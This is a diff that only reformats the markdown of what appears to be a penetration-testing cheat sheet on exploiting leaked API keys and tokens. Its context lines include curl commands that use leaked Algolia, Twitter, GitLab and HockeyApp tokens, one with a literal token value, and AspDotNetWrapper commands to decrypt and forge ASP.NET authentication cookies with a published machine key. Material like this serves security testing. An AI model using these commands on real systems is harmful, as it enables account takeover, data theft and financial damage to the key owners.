@@ -6,19 +6,18 @@
 
 - [Tools](#tools)
 - [Exploit](#exploit)
-    - [Google Maps](#google-maps)
-    - [Algolia](#algolia)
-    - [AWS Access Key ID & Secret](#aws-access-key-id--secret)
-    - [Slack API Token](#slack-api-token)
-    - [Facebook Access Token](#facebook-access-token)
-    - [Github client id and client secret](#github-client-id-and-client-secret)
-    - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
-    - [Twitter API Secret](#twitter-api-secret)
-    - [Twitter Bearer Token](#twitter-bearer-token)
-    - [Gitlab Personal Access Token](#gitlab-personal-access-token)
-    - [HockeyApp API Token](#hockeyapp-api-token)
-    - [Auth Bypass using pre-published Machine Key](#auth-bypass-using-pre-published-machine-key)
-
+  - [Google Maps](#google-maps)
+  - [Algolia](#algolia)
+  - [AWS Access Key ID & Secret](#aws-access-key-id--secret)
+  - [Slack API Token](#slack-api-token)
+  - [Facebook Access Token](#facebook-access-token)
+  - [Github client id and client secret](#github-client-id-and-client-secret)
+  - [Twilio Account_sid and Auth Token](#twilio-account_sid-and-auth-token)
+  - [Twitter API Secret](#twitter-api-secret)
+  - [Twitter Bearer Token](#twitter-bearer-token)
+  - [Gitlab Personal Access Token](#gitlab-personal-access-token)
+  - [HockeyApp API Token](#hockeyapp-api-token)
+  - [Auth Bypass using pre-published Machine Key](#auth-bypass-using-pre-published-machine-key)
 
 ## Tools
 
@@ -29,15 +28,16 @@
 
 The following commands can be used to takeover accounts or extract personnal informations from the API using the leaked token.
 
-### Google Maps 
+### Google Maps
 
-Use : https://github.com/ozguralp/gmapsapiscanner/
+Use : <https://github.com/ozguralp/gmapsapiscanner/>
 
 Impact:
+
 * Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
 * Conduct a denial of service attack specific to the service if any limitation of maximum bill control settings exist in the Google account
 
-### Algolia 
+### Algolia
 
 ```powershell
 curl --request PUT \
@@ -98,13 +98,11 @@ curl --request GET --url https://api.twitter.com/1.1/account_activity/all/subscr
 curl "https://gitlab.example.com/api/v4/projects?private_token=<your_access_token>"
 ```
 
-
 ### HockeyApp API Token
 
 ```powershell
 curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hockeyapp.net/api/2/apps/2021bdf2671ab09174c1de5ad147ea2ba4
 ```
-
 
 ### Auth Bypass using pre-published Machine Key
 
@@ -112,7 +110,7 @@ curl -H "X-HockeyAppToken: ad136912c642076b0d1f32ba161f1846b2c" https://rink.hoc
 
 That machine key is used for encryption and decryption of forms authentication cookie data and view-state data, and for verification of out-of-process session state identification.
 
-Example of a machineKey from https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication.
+Example of a machineKey from <https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication>.
 
 ```xml
 <machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
@@ -127,7 +125,6 @@ $ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX 
 # encrypt cookie (edit Decrypted.txt)
 $ AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
 ```
-
 
 ## References
 
